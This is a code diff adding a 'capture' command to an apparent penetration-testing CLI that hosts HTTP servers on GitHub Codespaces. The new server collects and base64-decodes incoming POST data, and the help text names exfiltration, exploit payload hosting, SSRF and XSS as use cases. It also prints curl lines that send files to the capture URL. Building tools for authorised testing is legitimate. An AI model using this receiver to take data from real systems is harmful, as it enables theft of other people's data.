@@ -16,6 +16,7 @@ from .templates import (
     FILE_SERVER_SCRIPT as _FILE_SERVER_SCRIPT,  # noqa: F401
     REDIRECT_SERVER_SCRIPT as _REDIRECT_SERVER_SCRIPT,  # noqa: F401
     CUSTOM_SERVER_SCRIPT as _CUSTOM_SERVER_SCRIPT,  # noqa: F401
+    CAPTURE_SERVER_SCRIPT as _CAPTURE_SERVER_SCRIPT,  # noqa: F401
 )
 from .utils import Config, get_logger
 
@@ -282,6 +283,51 @@ def _tail_remote_logs(gh: GitHubManager, cs_name: str) -> None:
         pass  # Normal exit
 
 
+def _download_captures(gh: GitHubManager, cs_name: str) -> None:
+    """
+    Download captured files from the Codespace to the current working directory.
+
+    Lists all files in /tmp/serve/captures/ and downloads each one via SSH cat.
+
+    Args:
+        gh: GitHub manager
+        cs_name: Codespace name
+    """
+    logger = get_logger()
+
+    result = _ssh(gh, cs_name, "ls -1 /tmp/serve/captures/ 2>/dev/null")
+    if result.returncode != 0 or not result.stdout.strip():
+        logger.info("No captures to download.")
+        return
+
+    stdout = result.stdout if isinstance(result.stdout, str) else result.stdout.decode()
+    files = stdout.strip().splitlines()
+    if not files:
+        logger.info("No captures to download.")
+        return
+
+    logger.info(f"Downloading {len(files)} capture file(s)...")
+
+    for filename in files:
+        remote_path = f"/tmp/serve/captures/{filename}"
+        local_path = Path(filename)
+
+        dl_result = subprocess.run(
+            ['gh', 'codespace', 'ssh', '--codespace', cs_name,
+             '--', f'cat {remote_path}'],
+            capture_output=True,
+            timeout=30
+        )
+
+        if dl_result.returncode == 0:
+            local_path.write_bytes(dl_result.stdout)
+            logger.info(f"  Downloaded: {filename} ({len(dl_result.stdout)} bytes)")
+        else:
+            logger.warning(f"  Failed to download: {filename}")
+
+    logger.info("All captures downloaded to current directory.")
+
+
 def _show_banner(title: str, cs_name: str, port: int, **info: str) -> None:
     """
     Print the serve information banner.
@@ -510,6 +556,54 @@ def serve_custom(port: int, response_body: str, content_type: str,
                    banner_fn=banner)
 
 
+def serve_capture(port: int, gh: GitHubManager, config: Config = None) -> None:
+    """
+    Start a capture server that logs and saves all incoming POST data.
+
+    Accepts any HTTP path. POST data is saved to /tmp/serve/captures/ on the
+    Codespace. Base64-encoded data is auto-detected and decoded. On exit,
+    all captured files are downloaded to the local working directory.
+
+    Args:
+        port: Port to listen on
+        gh: GitHub manager
+        config: Configuration (for codespace selection)
+    """
+    logger = get_logger()
+
+    config = config or Config()
+    cs_name = _get_available_codespace(gh, config)
+    logger.info(f"Using Codespace: {cs_name}")
+    logger.info(f"Port: {port}")
+
+    _setup_server_environment(gh, cs_name, port)
+    _ssh(gh, cs_name, "mkdir -p /tmp/serve/captures")
+
+    def banner(cs, p):
+        url = f"https://{cs}-{p}.app.github.dev/"
+        sep = "=" * 60
+        print(f"\n{sep}")
+        print("Capture server is running!")
+        print(f"{sep}\n")
+        print(f"Capture URL:\n  {url}\n")
+        print(f"Local:        http://localhost:{p}/\n")
+        print("Send data with:")
+        print(f"  curl -X POST -d 'data here' {url}")
+        print(f"  curl -X POST --data-binary @file.bin {url}")
+        print(f"  echo -n 'SGVsbG8=' | curl -X POST -d @- {url}\n")
+        print("Base64 payloads are auto-detected and decoded.")
+        print("Captures saved to /tmp/serve/captures/ on Codespace.")
+        print("On Ctrl+C, all captures will be downloaded locally.\n")
+        print("Press Ctrl+C to stop and download captures\n")
+
+    _launch_server(gh, cs_name, port,
+                   script=_CAPTURE_SERVER_SCRIPT.format(PORT=port),
+                   script_name="capture_server.py",
+                   banner_fn=banner)
+
+    _download_captures(gh, cs_name)
+
+
 def stop_server(port: int, gh: GitHubManager, config: Config = None) -> None:
     """
     Stop server running on the specified port in the Codespace.
@@ -652,6 +746,16 @@ def cmd_custom(args, config: Config, gh: GitHubManager) -> int:
     return 0
 
 
+def cmd_capture(args, config: Config, gh: GitHubManager) -> int:
+    """Start capture server."""
+    serve_capture(
+        port=args.port,
+        gh=gh,
+        config=config
+    )
+    return 0
+
+
 def cmd_stop(args, config: Config, gh: GitHubManager) -> int:
     """Stop server on a port."""
     port = int(args.port) if hasattr(args, 'port') and args.port else DEFAULT_PORT
@@ -687,6 +791,7 @@ COMMANDS:
     dir <directory> [port]          Serve a directory
     redirect <url> [port] [code]    Redirect to URL (301/302/307/308)
     custom <port> <body> [type] [status]  Custom response
+    capture [port]                  Capture POST data (base64 auto-decode)
     stop [port]                     Stop server on specific port
     clean                           Kill ALL servers and port forwards
     list                            List served files
@@ -719,6 +824,10 @@ EXAMPLES:
     cs-serve custom 9999 '{{"status":"ok"}}' "application/json"
     cs-serve custom 9999 '<script>alert(1)</script>' "text/html"
 
+    # Capture POST data
+    cs-serve capture
+    cs-serve capture 8080
+
     # Stop the server
     cs-serve stop
 
@@ -735,6 +844,7 @@ USE CASES:
     - SSRF testing: Redirect to internal IPs/services
     - OAuth testing: Open redirect vulnerabilities
     - XSS: javascript: protocol redirects
+    - Data capture: Log and save POST data with base64 auto-decode
     - Exfiltration: Capture data via request logging
     - Payload hosting: Serve exploit files
 
@@ -756,6 +866,7 @@ SERVE_COMMANDS = {
     'dir':      cmd_dir,
     'redirect': cmd_redirect,
     'custom':   cmd_custom,
+    'capture':  cmd_capture,
     'stop':     cmd_stop,
     'clean':    cmd_clean,
     'cleanup':  cmd_clean,   # Alias
